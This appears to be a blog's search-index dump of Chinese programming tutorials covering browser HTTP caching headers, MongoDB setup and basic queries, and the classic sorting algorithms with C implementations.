Cache-Control缓存原理\n浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Cache-Control，如：\n\n\n\n浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来\n浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，根据它第一次的请求时间和Cache-Control设定的有效期，计算出一个资源过期时间，再拿这个过期时间跟当前的请求时间比较，如果请求时间在过期时间之前，就能命中缓存，否则就不行\n如果缓存没有命中，浏览器直接从服务器加载资源时，Cache-Control Header在重新加载的时候会被更新\n\n\nCache-Control描述的是一个相对时间，在进行缓存命中的时候，都是利用客户端时间进行判断，所以相比较Expires，Cache-Control的缓存管理更有效，安全一些。\n这两个header可以只启用一个，也可以同时启用，当response header中，Expires和Cache-Control同时存在时，Cache-Control优先级高于Expires：\n\n\n三、强缓存的管理\n前面介绍的是强缓存的原理，在实际应用中我们会碰到需要强缓存的场景和不需要强缓存的场景，通常有2种方式来设置是否启用强缓存\n\n\n通过代码的方式，在web服务器返回的响应中添加Expires和Cache-Control Header\n通过配置web服务器的方式，让web服务器在响应资源的时候统一添加Expires和Cache-Control Header\n\n\n比如在javaweb里面，我们可以使用类似下面的代码设置强缓存\n\njava.util.Date date = new java.util.Date();    response.setDateHeader(&quot;Expires&quot;,date.getTime()+20000); //Expires:过时期限值 response.setHeader(&quot;Cache-Control&quot;, &quot;public&quot;); //Cache-Control来控制页面的缓存与否,public:浏览器和缓存服务器都可以缓存页面信息；response.setHeader(&quot;Pragma&quot;, &quot;Pragma&quot;); //Pragma:设置页面是否缓存，为Pragma则缓存，no-cache则不缓存\n\n\n还可以通过类似下面的java代码设置不启用强缓存\n\nresponse.setHeader( &quot;Pragma&quot;, &quot;no-cache&quot; );   response.setDateHeader(&quot;Expires&quot;, 0);   response.addHeader( &quot;Cache-Control&quot;, &quot;no-cache&quot; );//浏览器和缓存服务器都不应该缓存页面信息\n\n\nnginx和apache作为专业的web服务器，都有专门的配置文件，可以配置expires和cache-control，这方面的知识，如果你对运维感兴趣的话，可以在百度上搜索nginx 设置 expires cache-control或 apache 设置 expires cache-control 都能找到不少相关的文章。\n由于在开发的时候不会专门去配置强缓存，而浏览器又默认会缓存图片，css和js等静态资源，所以开发环境下经常会因为强缓存导致资源没有及时更新而看不到最新的效果，解决这个问题的方法有很多，常用的有以下几种\n\n处理缓存带来的问题\n\n直接ctrl+f5，这个办法能解决页面直接引用的资源更新的问题\n使用浏览器的隐私模式开发\n如果用的是chrome，可以f12在network那里把缓存给禁掉（这是个非常有效的方法）\n\n\n\n在开发阶段，给资源加上一个动态的参数，如css/index.css?v=0.0001，由于每次资源的修改都要更新引用的位置，同时修改参数的值，所以操作起来不是很方便，除非你是在动态页面比如jsp里开发就可以用服务器变量来解决（v=$&#123;sysRnd&#125;），或者你能用一些前端的构建工具来处理这个参数修改的问题\n如果资源引用的页面，被嵌入到了一个iframe里面，可以在iframe的区域右键单击重新加载该页面，以chrome为例\n\n\n\n如果缓存问题出现在ajax请求中，最有效的解决办法就是ajax的请求地址追加随机数\n还有一种情况就是动态设置iframe的src时，有可能也会因为缓存问题，导致看不到最新的效果，这时候在要设置的src后面添加随机数也能解决问题\n如果你用的是grunt和gulp、webpack这种前端工具开发，通过它们的插件比如grunt-contrib-connect来启动一个静态服务器，则完全不用担心开发阶段的资源更新问题，因为在这个静态服务器下的所有资源返回的respone header中，cache-control始终被设置为不缓存\n\n\n四、强缓存的应用\n强缓存是前端性能优化最有力的工具，没有之一，对于有大量静态资源的网页，一定要利用强缓存，提高响应速度。通常的做法是，为这些静态资源全部配置一个超时时间超长的Expires或Cache-Control，这样用户在访问网页时，只会在第一次加载时从服务器请求静态资源，其它时候只要缓存没有失效并且用户没有强制刷新的条件下都会从自己的缓存中加载，比如前面提到过的京东首页缓存的资源，它的缓存过期时间都设置到了2026年\n\n\n\n然而这种缓存配置方式会带来一个新的问题，就是发布时资源更新的问题，比如某一张图片，在用户访问第一个版本的时候已经缓存到了用户的电脑上，当网站发布新版本，替换了这个图片时，已经访问过第一个版本的用户由于缓存的设置，导致在默认的情况下不会请求服务器最新的图片资源，除非他清掉或禁用缓存或者强制刷新，否则就看不到最新的图片效果\n\n这个问题已经有成熟的解决方案，具体内容可阅读知乎这篇文章详细了解：http://www.zhihu.com/question/20790576\n文章提到的东西都属于理论上的解决方案，不过现在已经有很多前端工具能够实际地解决这个问题，由于每个工具涉及到的内容细节都有很多，本文没有办法一一深入介绍。有兴趣的可以去了解下grunt gulp webpack fis还有edp这几个工具，基于这几个工具都能解决这个问题，尤其是fis和edp是百度推出的前端开发平台，有现成的文档可以参考：\nhttp://fis.baidu.com/fis3/api/index.html\nhttp://ecomfe.github.io/edp/doc/initialization/install/\n\n强缓存还有一点需要注意的是，通常都是针对静态资源使用，动态资源需要慎用，除了服务端页面可以看作动态资源外，那些引用静态资源的html也可以看作是动态资源，如果这种html也被缓存，当这些html更新之后，可能就没有机制能够通知浏览器这些html有更新，尤其是前后端分离的应用里，页面都是纯html页面，每个访问地址可能都是直接访问html页面，这些页面通常不加强缓存，以保证浏览器访问这些页面时始终请求服务器最新的资源\n\n五、协商缓存的原理5.1 介绍\n当浏览器对某个资源的请求没有命中强缓存，就会发一个请求到服务器，验证协商缓存是否命中，如果协商缓存命中，请求响应返回的http状态为304并且会显示一个Not Modified的字符串，比如你打开京东的首页，按f12打开开发者工具，再按f5刷新页面，查看network，可以看到有不少请求就是命中了协商缓存的\n\n\n\n查看单个请求的Response Header，也能看到304的状态码和Not Modified的字符串，只要看到这个就可说明这个资源是命中了协商缓存，然后从客户端缓存中加载的，而不是服务器最新的资源\n\n\n5.2 Last-Modified，If-Modified-Since控制协商缓存\n浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Last-Modified的header，这个header表示这个资源在服务器上的最后修改时间\n\n\n\n浏览器再次跟服务器请求这个资源时，在request的header上加上If-Modified-Since的header，这个header的值就是上一次请求时返回的Last-Modified的值\n\n\n\n服务器再次收到资源请求时，根据浏览器传过来If-Modified-Since和资源在服务器上的最后修改时间判断资源是否有变化，如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。当服务器返回304 Not Modified的响应时，response header中不会再添加Last-Modified的header，因为既然资源没有变化，那么Last-Modified也就不会改变，这是服务器返回304时的response header\n\n\n\n浏览器收到304的响应后，就会从缓存中加载资源\n如果协商缓存没有命中，浏览器直接从服务器加载资源时，Last-Modified Header在重新加载的时候会被更新，下次请求时，If-Modified-Since会启用上次返回的Last-Modified值\n\n\n【Last-Modified，If-Modified-Since】都是根据服务器时间返回的header，一般来说，在没有调整服务器时间和篡改客户端缓存的情况下，这两个header配合起来管理协商缓存是非常可靠的，但是有时候也会服务器上资源其实有变化，但是最后修改时间却没有变化的情况，而这种问题又很不容易被定位出来，而当这种情况出现的时候，就会影响协商缓存的可靠性。所以就有了另外一对header来管理协商缓存，这对header就是【ETag、If-None-Match】。它们的缓存管理的方式是\n\n5.3 ETag、If-None-Match控制协商缓存\n浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上ETag的header，这个header是服务器根据当前请求的资源生成的一个唯一标识，这个唯一标识是一个字符串，只要资源有变化这个串就不同，跟最后修改时间没有关系，所以能很好的补充Last-Modified的问题\n\n\n\n浏览器再次跟服务器请求这个资源时，在request的header上加上If-None-Match的header，这个header的值就是上一次请求时返回的ETag的值\n\n\n\n服务器再次收到资源请求时，根据浏览器传过来If-None-Match和然后再根据资源生成一个新的ETag，如果这两个值相同就说明资源没有变化，否则就是有变化；如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化\n\n\n\n浏览器收到304的响应后，就会从缓存中加载资源。\n\n六、协商缓存的管理\n协商缓存跟强缓存不一样，强缓存不发请求到服务器，所以有时候资源更新了浏览器还不知道，但是协商缓存会发请求到服务器，所以资源是否更新，服务器肯定知道。大部分web服务器都默认开启协商缓存，而且是同时启用【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】，比如apache:\n\n\n\n如果没有协商缓存，每个到服务器的请求，就都得返回资源内容，这样服务器的性能会极差。\n\n\n【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】一般都是同时启用，这是为了处理Last-Modified不可靠的情况。\n\n有一种场景需要注意\n\n分布式系统里多台机器间文件的Last-Modified必须保持一致，以免负载均衡到不同机器导致比对失败；\n分布式系统尽量关闭掉ETag(每台机器生成的ETag都会不一样）；\n京东页面的资源请求，返回的repsones header就只有Last-Modified，没有ETag：\n\n\n\n协商缓存需要配合强缓存使用，你看前面这个截图中，除了Last-Modified这个header，还有强缓存的相关header，因为如果不启用强缓存的话，协商缓存根本没有意义\n\n七、相关浏览器行为对缓存的影响\n如果资源已经被浏览器缓存下来，在缓存失效之前，再次请求时，默认会先检查是否命中强缓存，如果强缓存命中则直接读取缓存，如果强缓存没有命中则发请求到服务器检查是否命中协商缓存，如果协商缓存命中，则告诉浏览器还是可以从缓存读取，否则才从服务器返回最新的资源。这是默认的处理方式，这个方式可能被浏览器的行为改变：\n\n\n当ctrl+f5强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；\n当f5刷新网页时，跳过强缓存，但是会检查协商缓存\n\n","categories":["浏览器"],"tags":["浏览器"]},{"title":"mongodb","url":"/2019/04/07/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/","content":"一、环境搭建1.1 mongodb简介\nMongoDB旨在为WEB应用提供可扩展的高性能数据存储解决方案\nMongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON对象。字段值可以包含其他文档，数组及文档数组\n\n\n主要特点\n\n高可扩展性\n分布式存储\n低成本\n结构灵活\n\n1.2 window下mongodb环境搭建\n下载安装包或压缩包\n添加db存储和日志存储文件夹\n添加服务、配置环境变量、启动Mongo\n\n\n配置演示\n\n\n在任意目录创建几个文件夹\n\n\n通过命令行启动服务\n\n配置环境变量\n\n#  --dbpath指定数据存储位置C:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongod --dbpath d:\\mongodb\\data\n\n\n通配置启动服务\n# 配置d:\\mongodb\\etc\\mongodb.conf#数据库路径dbpath=d:\\mongodb\\data\\#日志输出文件路径logpath=d:\\mongodb\\logs\\mongodb.log#错误日志采用追加模式，配置这个选项后mongodb的日志会追加到现有的日志文件，而不是从新创建一个新文件logappend=true#启用日志文件，默认启用journal=true#这个选项可以过滤掉一些无用的日志信息，若需要调试使用请设置为falsequiet=true#端口号 默认为27017port=27017#指定存储引擎（默认先不加此引擎，如果报错了，大家在加进去）storageEngine=mmapv1#http配置 开启这个服务才可以在网页中访问 端口28017httpinterface=true\n\n\n启动方式\n\nC:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongod --config d:\\mongodb\\data\n\n\n更加简洁的启动方式\n\n安装到window的服务里面，打开Windows看一下\n\nC:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongod --config d:\\mongodb\\data --install --serviceName &quot;MongoDB&quot;\n\n\n使用MongoVue连接数据库\n\n1.3 linux下mongodb环境搭建\n下载安装包或压缩包\n添加db存储和日志存储文件夹\n添加服务、配置环境变量、启动Mongo\n\n# 远程登录服务器ssh root@123.142.25.365\n\n\n上传本地的安装包\n\n# 上传文件夹，传文件不需要rscp /mongodb/... -r root@123.142.25.365:/home# 传到服务器的/home/# 在指定的目录创建启动需要的文件$ cd /home/$ mkdir etc logs data$ touch logs/mongodb.log etc/mongo.conf# /home/etc/mongo.conf配置dbpath=/home/mongodb/datalogpath=/mongodb/logs/mongodb.loglogappend=truejournal=truequiet=trueport=2701# 启动服务mongod -f /home/mongodb/etc/mongo.conf# 创建软连接ln -s /home/mongodb/bin/mongo /usr/local/bin/mongoln -s /home/mongodb/bin/mongod /usr/local/bin/mongod\n\n二、基本概念2.1 数据库对比\n\n\nSQL术语&#x2F;概念\nMongoDB术语&#x2F;概念\n解析&#x2F;说明\n\n\n\ndatabase\ndatabase\n数据库\n\n\ntable\ncollection\n数据表&#x2F;集合\n\n\nrow\ndocument\n数据记录&#x2F;文档\n\n\ncolumn\nfield\n数据记录行&#x2F;文档\n\n\nindex\nindex\n索引\n\n\ntable\njoins\n表连接，MongoDB不支持\n\n\nprimary key\nprimary key\n主键,MongoDB自动将_id字段设置为主键\n\n\n\n2.2 数据库\n一个mongodb中可以建立多个数据库\nMongoDB的默认数据库为”db“，该数据库存储在data目录中\n&quot;show dbs&quot; 命令可以显示所有数据的列表\n执行 &quot;db&quot; 命令可以显示当前数据库对象或集合\n&quot;use&quot;命令，可以连接到一个指定的数据库\n\n2.3 文档\n文档是一组键值(key-value)对(即BSON)\n\n&#123;&quot;site&quot;:&quot;www.runoob.com&quot;, &quot;name&quot;:&quot;菜鸟教程&quot;&#125;\n\n2.4 插入文档\n切换数据库\n\nuse 数据库名(没有就创建)\n\n\n&#96;&#96;&#96;db.createCollection(“user”)\n  - 创建集合相当于创建表名  - 或者这样创建    - `db.user.inert(&#123;id:123&#125;)`## 2.5 插入数据表**1. 手动插入**\n\n切换创建数据库use demo \ngoods相当于数据表db.goods.insert({“prodictId”:”10001”,”productName”:”aaa”,”slaePrice”:246,”productImage”:”1.jpg”})\n创建数据表，暂时不需插入数据db.createCollection(“goods”)\n**2. 客户端插入**&gt; 利用`mongodbVue`导入# 三、常用操作## 3.1 创建用户**1. 创建管理员**- 开启服务\n–auth进行授权，需要认证才可以mongod -f d:&#x2F;mongodb&#x2F;etc&#x2F;mongodb.conf –auth\n**2. 通过非授权的方式启动服务**\n创建admin数据库use admin \n给admin数据库创建账号db.createUser({user:”admin”,pwd:”admin”,roles:[“root”]}) # 3.4db.addUser # 2.x\n创建成功需要认证db.auth(“admin”,”admin”) # 账号、密码\n![img](https://poetries1.gitee.io/img-repo/2019/10/353.png)**3. 给使用的数据库添加用户**1. 创建用户![img](https://poetries1.gitee.io/img-repo/2019/10/354.png)1. 然后在授权登录试一下## 3.2 MongoDB 创建数据库- `MongoDB` 创建数据库的语法格式如下- 如果数据库不存在，则创建数据库，否则切换到指定数据库\nuse DATABASE_NAME\n- 查看所有数据库  - `show dbs`- 我们刚创建的数据库 runoob 并不在数据库的列表中， 要显示它，我们需要向 runoob 数据库插入一些数据\n\ndb.runoob.insert({“name”:”poetries”})WriteResult({ “nInserted” : 1 })show dbs\n\n## 3.3 MongoDB 删除数据库- `MongoDB`删除数据库的语法格式如下- 删除当前数据库，默认为 `test`，你可以使用 `db` 命令查看当前数据库名\ndb.dropDatabase()\n## 3.4 删除集合\ndb.collection.drop()\n## 3.5 MongoDB 插入文档&gt; 文档的数据结构和`JSON`基本一样## 3.6 插入文档- `MongoDB` 使用 `insert()`或 `save()` 方法向集合中插入文档，语法如下\ndb.COLLECTION_NAME.insert(document)\n- 以下文档可以存储在 `MongoDB` 的 `runoob`数据库 的 `col` 集合中\n\ndb.col.insert({title: ‘MongoDB 学习’,    description: ‘MongoDB 是一个 Nosql 数据库’,    by: ‘poetries’,    url: ‘http://blog.poetries.top&#39;,    tags: [‘mongodb’, ‘database’, ‘NoSQL’],    likes: 100})\n\n- 以上实例中 `col` 是我们的集合名，如果该集合不在该数据库中， `MongoDB` 会自动创建该集合并插入文档。- 查看已插入文档\n\ndb.col.find()db.col.find().pretty() #格式化方式查看\n\n## 3.7 MongoDB 更新文档- `MongoDB` 使用 `update()` 和 `save()` 方法来更新集合中的文档## 3.7 update() 方法&gt; `update()` 方法用于更新已存在的文档。语法格式如下- 通过 `update()`方法来更新标题(`title`):\ndb.col.update({‘title’:’MongoDB 学习’},{$set:{‘title’:’MongoDB’}})\n# 四、常用查询语句| mongo                                                       | sql                                                          | 说明                                 || :---------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------- || `db.users.find()`                                           | `select * from users`                                        | 从`user`表中查询所有数据             || `db.users.find(&#123;“username” : “joe”, “age” : 27&#125;)`           | `select * from users where “username” = “joe” and age = 27`  | 查找`username = joe`且`age = 27`的人 || `db.users.find(&#123;&#125;, &#123;“username” : 1, “email” : 1&#125;)`          | `select username, email from users`                          | 查找`username`,`email`这`2`个子项    || `db.users.find(&#123;“age” : &#123;“$gt” : 18&#125;&#125;)`                     | `select * from users where age &gt;18`                          | 查找`age &gt; 18`的会员                 || `db.users.find(&#123;“age” : &#123;“$gte” : 18&#125;&#125;)`                    | `select * from users where age &gt;=18`                         | 查找`age &gt;= 18`的人                  || `db.users.find(&#123;“age” : &#123;“$lt” : 18&#125;&#125;)`                     | `select * from users where age &lt;18`                          | 查找`age &lt; 18`的人                   || `db.users.find(&#123;“age” : &#123;“$lte” : 18&#125;&#125;)`                    | `select * from users where age &lt;=18`                         | 查找`age &lt;= 18`的人                  || `db.users.find(&#123;“username” : &#123;“$ne” : “joe”&#125;&#125;)`             | `select * from users where username &lt;&gt; “joe”`                | 查找 `username != joe`的会员         || `db.users.find(&#123;“ticket_no” : &#123;“$in” : [725, 542, 390]&#125;&#125;)`  | `select * from users where ticket_no in (725, 542, 390)`     | 符合`tickt_no`在此范围的结果         || `db.users.find(&#123;“ticket_no” : &#123;“$nin” : [725, 542, 390]&#125;&#125;)` | `select * from users where ticket_no not in (725, 542, 390)` | 符合`tickt_no`不在此范围的结果       || `db.users.find(&#123;“name” : /joey^/&#125;)`                         | `select * from users where name like “joey%”`                | 查找前`4`个字符为`joey`的人          |# 五、MongoDB链接## 5.1 MongoDB链接express\nconst express &#x3D; require(‘express’);const mongoose &#x3D; require(‘mongoose’);const app &#x3D; express();\n&#x2F;&#x2F; 连接mongo 并且使用React这个集合，没有就会新建const DB_URL &#x3D; ‘mongodb:&#x2F;&#x2F;127.0.0.1:27017&#x2F;react’;mongoose.connect(DB_URL);mongoose.connection.on(‘connected’,()&#x3D;&gt;{    console.log(‘mongo connect success’);})\n&#x2F;&#x2F; 类似于MySQL的表 mongo里有文档、字段的概念\nconst User &#x3D; mongoose.model(‘user’,new mongoose.Schema({    user:{type:String,require:true},    age:{type:Number,require:true}}))\n&#x2F;&#x2F;新增数据&#x2F;&#x2F; User.create({&#x2F;&#x2F;     user:’小胡’,&#x2F;&#x2F;     age:18&#x2F;&#x2F; },(err,doc)&#x3D;&gt;{&#x2F;&#x2F;     if(!err) {&#x2F;&#x2F;         console.log(doc)&#x2F;&#x2F;     } else {&#x2F;&#x2F;         console.log(err)&#x2F;&#x2F;     }&#x2F;&#x2F; })\n&#x2F;&#x2F; 删除数据 {}过滤对象&#x2F;&#x2F; User.remove({age:22},(err,doc)&#x3D;&gt;{&#x2F;&#x2F;     console.log(doc)&#x2F;&#x2F; })&#x2F;&#x2F; 更新User.update({‘user’:’小明’},{‘$set’:{age:30}},(err,doc)&#x3D;&gt;{    console.log(doc)})app.get(‘&#x2F;‘,(req,res)&#x3D;&gt;{    res.send(‘Hello word!‘)})app.get(‘&#x2F;data’,(req,res)&#x3D;&gt;{    &#x2F;&#x2F; findOne 只返回一条，返回对象直接使用，而不是返回数组    User.findOne({‘user’:’小明’},(err,doc)&#x3D;&gt;{        res.json(doc)    })})\napp.listen(9000,()&#x3D;&gt;{    console.log(‘Node app listen 9000’)})&#96;&#96;&#96;\n","categories":["数据库"],"tags":["mongodb"]},{"title":"图解前端性能优化","url":"/2020/06/28/%E7%AE%97%E6%B3%95+%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/7%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/","content":"排序算法：一种能将一串数据依照特定的排序方式进行排列的一种算法。排序算法性能：取决于时间和空间复杂度，其次还得考虑稳定性，及其适应的场景。稳定性：让原本有相等键值的记录维持相对次序。也就是若一个排序算法是稳定的，当有俩个相等键值的记录R和S，且原本的序列中R在S前，那么排序后的列表中R应该也在S之前。\n\n1-冒泡排序原理俩俩比较相邻记录的排序码，若发生逆序，则交换；有俩种方式进行冒泡，一种是先把小的冒泡到前边去，另一种是把大的元素冒泡到后边。冒泡法大家都较熟悉。其原理为从a[0]开始，依次将其和后面的元素比较,若a[0]&gt;a[i]，则交换它们，一直比较到a[n]。同理对a1,a2,…a[n-1]处理，即完成排序\n冒泡排序的基本概念：\n依次比较相邻的两个数，将小数放在前面，大数放在后面。即在第一趟：首先比较第1个和第2个数，将小数放前，大数放后。然后比较第2个数和第3个数，将小数放前，大数放后，如此继续，直至比较最后两个数，将小数放前，大数放后。至此第一趟结束，将最大的数放到了最后。在第二趟：仍从第一对数开始比较（因为可能由于第2个数和第3个数的交换，使得第1个数不再小于第2个数），将小数放前，大数放后，一直比较到倒数第二个数（倒数第一的位置上已经是最大的），第二趟结束，在倒数第二的位置上得到一个新的最大数（其实在整个数列中是第二大的数）。如此下去，重复以上过程，直至最终完成排序。由于在排序过程中总是小数往前放，大数往后放，相当于气泡往上升，所以称作冒泡排序。\n实现：\n外循环变量设为i，内循环变量设为j。假如有10个数需要进行排序，则外循环重复9次，内循环依次重复9，8，…，1次。每次进行比较的两个元素都是与内循环j有关的，它们可以分别用a[j]和a[j+1]标识，i的值依次为1,2,…,9，对于每一个i,j的值依次为1,2,…10-i。\n图示：\n性能时间复杂度为O(N^2)，空间复杂度为O(1)。排序是稳定的，排序比较次数与初始序列无关，但交换次数与初始序列有关。\n优化若初始序列就是排序好的，对于冒泡排序仍然还要比较O(N^2)次，但无交换次数。可根据这个进行优化，设置一个flag，当在一趟序列中没有发生交换，则该序列已排序好，但优化后排序的时间复杂度没有发生量级的改变\n代码\n#include&lt;stdio.h&gt;void sort(int *a,int len)&#123;    int i,j,t;        for( i = 0;i&lt;len-1;++i)    &#123;        for(j = 0;j&lt;len-1-i;++j) 或者 j=i+1;j&lt;len;++j        &#123;            if(a[j] &gt;a[j+1])            &#123;                t  = a[j];                a[j] = a[j+1];                a[j+1] = t;            &#125;        &#125;    &#125;        &#125;void main()&#123;    int a[6] = &#123;10,2,8,-8,11,0&#125;;    int i = 0;    sort(a,6);        for(i = 0; i&lt;6;++i)    &#123;        printf(&quot;%d &quot;,a[i]);    &#125;    printf(&quot;\\n&quot;);&#125;\n\n冒泡法原理简单，但其缺点是交换次数多，效率低。下面介绍一种源自冒泡法但更有效率的方法“选择法”。\n\n2-选择排序原理每次从未排序的序列中找到最小值，记录并最后存放到已排序序列的末尾.选择法循环过程与冒泡法一致，它还定义了记号k&#x3D;i,然后依次把a[k]同后面元素比较，若a[k]&gt;a[j],则使k&#x3D;j.最后看看k&#x3D;i是否还成立，不成立则交换a[k],a[i],这样就比冒泡法省下许多无用的交换，提高了效率。\n性能时间复杂度为O(N^2)，空间复杂度为O(1)，排序是不稳定的（把最小值交换到已排序的末尾导致的），每次都能确定一个元素所在的最终位置，比较次数与初始序列无关。\n代码\n//直接选择排序#include&lt;stdio.h&gt;void sort(int *a,int len)&#123;\tint i,j,min,t;\tfor(i = 0;i&lt;len-1;++i)\t&#123;\t\tfor(min=i,j=i+1;j&lt;len;++j)\t\t&#123;\t\t\tif(a[min]&gt;a[j])\t\t\t\tmin = j;\t\t&#125;\t\tif(min!=i)\t\t&#123;\t\t\tt = a[i];\t\t\ta[i] = a[min];\t\t\ta[min] = t;\t\t&#125;\t&#125;&#125;void main()&#123;\tint a[6] = &#123;4,0,3,2,5,1&#125;;\tsort(a,6);//a代表数组的首地址\tfor(int i=0;i&lt;6;++i)\t\tprintf(&quot;%d\\n&quot;,a[i]);&#125;\n\n\n\n选择法比冒泡法效率更高，但说到高效率，非“快速法”莫属，现在就让我们来了解它。\n\n3-快速排序原理基本思想：\n快速排序是对冒泡排序的一种改进。由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。\n实现：设要排序的数组是A[0]……A[N-1]，首先任意选取一个数据（通常选用第一个数据）作为关键数据，然后将所有比它小的数都放到它前面，所有比它大的数都放到它后面，这个过程称为一趟快速排序。值得注意的是，快速排序不是一种稳定的排序算法，也就是说，多个相同的值的相对位置也许会在算法结束时产生变动。\n一趟快速排序的算法是：1）设置两个变量i、j，排序开始的时候：i&#x3D;0，j&#x3D;N-1；2）以第一个数组元素作为关键数据，赋值给key，即 key&#x3D;A[0]；3）从j开始向前搜索，即由后开始向前搜索（j – ），找到第一个小于key的值A[j]，A[i]与A[j]交换；4）从i开始向后搜索，即由前开始向后搜索（i ++ ），找到第一个大于key的A[i]，A[i]与A[j]交换；5）重复第3、4、5步，直到 I&#x3D;J； (3,4步是在程序中没找到时候j&#x3D;j-1，i&#x3D;i+1，直至找到为止。找到并交换的时候i， j指针位置不变。另外当i&#x3D;j这过程一定正好是i+或j-完成的最后令循环结束。）\n图示：\n举例说明：\n如无序数组[6 2 4 1 5 9]\n\na),先把第一项[6]取出来,\n用[6]依次与其余项进行比较,\n如果比[6]小就放[6]前边,2 4 1 5都比[6]小,所以全部放到[6]前边\n如果比[6]大就放[6]后边,9比[6]大,放到[6]后边,&#x2F;&#x2F;6出列后大喝一声,比我小的站前边,比我大的站后边,行动吧!霸气十足~\n\n\n\n一趟排完后变成下边这样:\n\n排序前 6 2 4 1 5 9\n排序后 2 4 1 5 6 9\n\nb),对前半拉[2 4 1 5]继续进行快速排序\n重复步骤a)后变成下边这样:\n\n排序前 2 4 1 5\n排序后 1 2 4 5\n\n前半拉排序完成,总的排序也完成:\n\n排序前:[6 2 4 1 5 9]\n排序后:[1 2 4 5 6 9]\n\n性能快排的平均时间复杂度为O(NlogN），空间复杂度为O(logN)，但最坏情况下，时间复杂度为O(N^2)，空间复杂度为O(N)；且排序是不稳定的，但每次都能确定一个元素所在序列中的最终位置，复杂度与初始序列有关。\n优化当初始序列是非递减序列时，快排性能下降到最坏情况，主要因为基准每次都是从最左边取得，这时每次只能排好一个元素。所以快排的优化思路如下：\n优化基准，不每次都从左边取，可以进行三路划分，分别取最左边，中间和最右边的中间值，再交换到最左边进行排序；或者进行随机取得待排序数组中的某一个元素，再交换到最左边，进行排序。在规模较小情况下，采用直接插入排序代码\n\n//快速排序#include&lt;stdio.h&gt;int FindPos(int * a, int low, int high)&#123;\tint val = a[low];\twhile (low &lt; high)\t&#123;\t\twhile (low&lt;high  &amp;&amp; a[high]&gt;=val)\t\t\t--high;\t\ta[low] = a[high];\t\twhile (low&lt;high &amp;&amp; a[low]&lt;=val)\t\t\t++low;\t\ta[high] = a[low];\t&#125;//终止while循环之后low和high一定是相等的\ta[low] = val; \treturn high; //high可以改为low, 但不能改为val 也不能改为a[low]  也不能改为a[high]&#125;void QuickSort(int *a,int low,int high)&#123;\tint pos;\tif(low&lt;high)\t&#123;\t\tpos = FindPos(a,low,high);//找到a数组下标low-high  \t\tQuickSort(a,low,pos-1);//把元素劈成两半  左半边\t\tQuickSort(a,pos+1,high);//右半边\t&#125;&#125;void main()&#123;\tint i;\tint a[6] = &#123;2,1,3,0,5,4&#125;;\tQuickSort(a,0,5);//0表示第一个元素下标 5表示最后一个元素的下标\t\tfor(i = 0;i&lt;6;++i)\t\tprintf(&quot;%d\\n&quot;,a[i]);&#125;\n\n\n4-插入排序原理依次选择一个待排序的数据，插入到前边已排好序的序列中。\n性能时间复杂度为O(N^2)，空间复杂度为O(1)。算法是稳定的，比较次数和交换次数都与初始序列有关。\n优化直接插入排序每次往前插入时，是按顺序依次往前找，可在这里进行优化，往前找合适的插入位置时采用二分查找的方式，即折半插入。折半插入排序相对直接插入排序而言：平均性能更快，时间复杂度降至O(NlogN)，排序是稳定的，但排序的比较次数与初始序列无关，总是需要foor(log(i))+1次排序比较。\n使用场景当数据基本有序时，采用插入排序可以明显减少数据交换和数据移动次数，进而提升排序效率\n代码：\nvoid insert_sort(int *a,int n) &#123;         int i,j,temp;         for(i=1;i&lt;n;i++)     &#123;             temp=a[i]; /*temp为要插入的元素*/                 j=i-1;                 while(j&gt;=0&amp;&amp;temp&lt;a[j])         &#123;             /*从a[i-1]开始找比a[i]小的数，同时把数组元素向后移*/                         a[j+1]=a[j];                         j--;             &#125;              a[j+1]=temp; /*插入*/         &#125; &#125;\n\n\n5-希尔排序原理\nShell法是一个叫 shell 的美国人与1969年发明的。它首先把相距k(k&gt;&#x3D;1)的那几个元素排好序，再缩小k值（一般取其一半），再排序，直到k&#x3D;1时完成排序\n插入排序的改进版，是基于插入排序的以下俩点性质而提出的改进方法：\n\n插入排序对几乎已排好序的数据操作时，效率很高，可以达到线性排序的效率。\n但插入排序在每次往前插入时只能将数据移动一位，效率比较低。\n\n性能开始时，gap取值较大，子序列中的元素较少，排序速度快，克服了直接插入排序的缺点；其次，gap值逐渐变小后，虽然子序列的元素逐渐变多，但大多元素已基本有序，所以继承了直接插入排序的优点，能以近线性的速度排好序。\nvoid shell_sort(int *a,int n) &#123;     int i,j,k,x;         k=n/2; /*间距值*/         while(k&gt;=1)     &#123;             for(i=k;i&lt;n;i++)        &#123;                         x=a[i];                                 j=i-k;                                 while(j&gt;=0&amp;&amp;x&lt;a[j])                 &#123;                                         a[j+k]=a[j];                                         j-=k;                 &#125;                                    a[j+k]=x;                            &#125;                                 k/=2; /*缩小间距值*/             &#125; 